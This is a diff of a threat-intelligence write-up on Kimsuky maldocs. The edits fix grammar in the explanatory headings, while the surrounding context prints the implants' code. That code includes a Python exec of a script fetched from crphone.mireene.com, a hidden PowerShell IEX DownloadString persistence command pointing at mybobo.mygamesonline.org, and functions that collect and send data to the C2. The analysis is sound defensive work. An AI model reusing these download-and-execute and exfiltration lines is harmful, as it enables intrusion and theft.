@@ -20,7 +20,7 @@
 <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web" TargetMode="External"/>
 </Relationships>
 ```
-<h6>This execute a second maldoc with a macro. The first block of the VBA code is the declaration for use the functions of the office version on Mac.</h6>
+<h6>This executes a second maldoc with a macro. The first block of the VBA code is the declaration for use the functions of the office version on Mac. <br/>Note : Mac OS X 10.8 comes with Python 2.7 pre-installed by Apple and now Python 3 on the lastest releases.</h6>
 
 ```python
 #If Mac Then
@@ -32,7 +32,7 @@
 #End If
 ```
 
-<h6>The last block of code is the function for auto-execute the malicious code. This request and execute python code in memory (fileless).</h6>
+<h6>The last block of code is the function for auto-executing the malicious code. This request and execute python code in memory (fileless).</h6>
 
 ```python
 Sub AutoOpen()
@@ -58,14 +58,14 @@ eHandler: 'if an error is throw exit
 End Sub
 ```
 
-<h6>Firstly,this declare the imports, interesting to note that use posixpath package for get an universal path ( with "/") for easily manage theirs paths.  </h6>
+<h6>Firstly,this declares the imports, interesting to note that use posixpath package for getting a universal path (with "/") for easily manage theirs paths.</h6>
 
 ```python
 import os;
 import posixpath;
 import urllib2;
 ```
-<h6> Once this done, this create the path, enforce to remove the current maldoc and write it again (force but don't check their existence on the disk) for the persistence. </h6>
+<h6> Once this done, this create the path, enforce to remove the current maldoc and write it again (force but don't check their existence on the disk) for the persistence.</h6>
 
 ```python
 home_dir = posixpath.expandvars("$HOME");
@@ -76,13 +76,13 @@ data = urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor
 os.write(fd, data);
 os.close(fd)
 ```
-<h6> Finally, execute the last fileless python script for the recon actions.</h6>
+<h6>Finally, execute the last fileless python script for the recon actions.</h6>
 
 ```python
 exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read())
 ```
 
-<h6>The first two functions of the final python script are for execute a new shell and push the program on an infinite loop.</h6>
+<h6>The first two functions of the final python script are for executing a new shell and push the program on an infinite loop.</h6>
 
 ```python
 import os
@@ -102,7 +102,7 @@ def SpyLoop():
   time.sleep(300)
 ``` 
 
-<h6>The Collectdata function queries for get the system informations, files on the differents repetories, pack it on a password ZIP and send it to the C2.</h6>
+<h6>The Collectdata function queries for getting the system informations, files on the differents repertories, pack it on a password ZIP and send it to the C2.</h6>
 
 ```python
 def CollectData():
@@ -153,7 +153,7 @@ def CollectData():
   print "error"
 ```
 
-<h6>This reuse the code of the structure of the php form for send teh data of the C2.</h6>
+<h6>This reuse the code of the structure of the php form for sending teh data of the C2.</h6>
 
 ```html
 <form enctype="multipart/form-data" action="upload.php?param=" method="post">
@@ -163,14 +163,14 @@ def CollectData():
 </form>
 ```
 
-<h6>The main code execute a new thread the SpyLoop function.</h6>
+<h6>The main code executes a new thread the SpyLoop function.</h6>
 
 ```python
 main_thread = threading.Thread(target=SpyLoop)
 main_thread.start()
 ```
 <h3>Powershell implant<a name="Windows"></a></h3>
-<h6>The initial vector is a maldoc with a VBA macro which use an auto-execute function for get the content of theirs froms and execute in memory. The rest of the last three functions are useless.</h6>
+<h6>The initial vector is a maldoc with a VBA macro which use an auto-execute function for get the content of theirs forms and execute in memory. The rest of the last three functions are useless.</h6>
 
 ```vb
 Sub AutoOpen()
@@ -237,7 +237,7 @@ Sub regpa()
  Selection.PageSetup.BottomMargin = CentimetersToPoints(2.5)
 End Sub
 ```
-<h6>The first block of the Powershell script is the values used for the configuration (persistence, URL to join, path of the files, for run payload...).</h6>
+<h6>The first block of the Powershell script is the values used for the configuration (Persistence, URL to join, path of the files, for run payload...).</h6>
 
 ```csharp
 $SERVER_ADDR = "http://mybobo.mygamesonline.org/flower01/"
@@ -254,7 +254,7 @@ $RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 $regValue = "cmd.exe /c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')"
 ```
 
-<h6>The next block is for get the same informations that the MacOS version and for decode the commands send by the C2 to execute to victim.</h6>
+<h6>The next block is for getting the same informations that the MacOS version and for decode the commands send by the C2 to execute to the victim.</h6>
 
 ```csharp
 function Get_info($logpath)
@@ -387,7 +387,7 @@ function UpLoadFunc($logpath)
 }
 ```
 
-<h6>The main function push the persistence, send the data stolen and wait the new order.</h6>
+<h6>The main function pushes the persistence, send the data stolen and wait for the new order.</h6>
 
 ```csharp
 function main
@@ -415,9 +415,7 @@ function main
 }
 main
 ```
-
-
-     
+   
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 #### Similarities between the different versions of kimsuky
 
@@ -425,7 +423,7 @@ main
 <ul>
 <li><h6>On the URL path used for download script path like {?filename}=FilenameRquested".</h6></li>
 <li><h6>The structure used for upload the data are edited and pushed in the header.</h6></li>
-<li><h6>Multiples domains using the same base of domain mireene.com with recent samples of Kimsuky spotted :</h6></li>
+<li><h6>Multiples domains using the same base of the domain mireene.com with recent samples of Kimsuky spotted :</h6></li>
 
 <table>
 <tr>
@@ -451,7 +449,7 @@ main
 </table>
 </ul>
 
-<h6>The domains have the same output IP too and are located in South Korea</h6>
+<h6>The domains have the same output IP too and are located in South Korea :</h6>
 
 <table>
 <tr>
